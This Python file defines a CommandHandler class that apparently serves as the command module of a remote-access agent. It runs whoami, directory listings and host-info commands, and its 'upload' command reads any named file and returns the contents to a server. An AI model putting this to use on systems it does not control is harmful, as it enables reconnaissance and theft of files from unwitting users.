import os
import platform

class CommandHandler:
    def __init__(self):
        self.commands = {
            "whoami": "Retrieve the current username",
            "dir": "List directory contents (Windows)",
            "ls": "List directory contents (Linux, placeholder)",
            "info": "Return basic system info",
            "upload": "Upload a file to the server (syntax: upload <filename>)",
            "download": "Download a file from the server (syntax: download <filename>)"
        }

    def execute(self, command):
        try:
            if command == "whoami":
                return os.popen("whoami").read().strip() if platform.system() == "Windows" else os.popen("whoami").read().strip()
            elif command == "dir":
                return os.popen("dir").read().strip() if platform.system() == "Windows" else "Command not supported on this OS"
            elif command == "ls":
                return os.popen("ls").read().strip() if platform.system() != "Windows" else "Command not supported on this OS"
            elif command == "info":
                return f"OS: {platform.system()} {platform.release()}, Hostname: {platform.node()}"
            elif command.startswith("upload "):
                filename = command.split(" ", 1)[1]
                with open(filename, "rb") as f:
                    return f"FILE:{filename}:{f.read().decode('utf-8', errors='ignore')}"
            elif command.startswith("download "):
                return f"Requesting download: {command.split(' ', 1)[1]}"
            else:
                return f"Unknown command: {command}"
        except Exception as e:
            return f"Error: {e}"

    def list_commands(self):
        return "\n".join([f"  {cmd}: {desc}" for cmd, desc in self.commands.items()])